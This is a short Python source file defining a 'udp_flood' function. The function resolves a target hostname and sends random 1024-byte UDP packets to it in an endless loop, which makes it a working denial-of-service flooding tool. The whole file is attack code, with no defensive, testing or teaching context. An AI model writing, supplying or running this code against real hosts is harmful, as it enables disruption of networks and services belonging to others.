import socket
import random

def udp_flood(target, num_threads):
    target_ip = socket.gethostbyname(target)
    port = random.randint(1, 65535)
    while True:
        try:
            data = random._urandom(1024)
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(data, (target_ip, port))
                print(f"UDP Flood: {target_ip}:{port}")
        except Exception as e:
            print(f"UDP Flood Error: {e}")
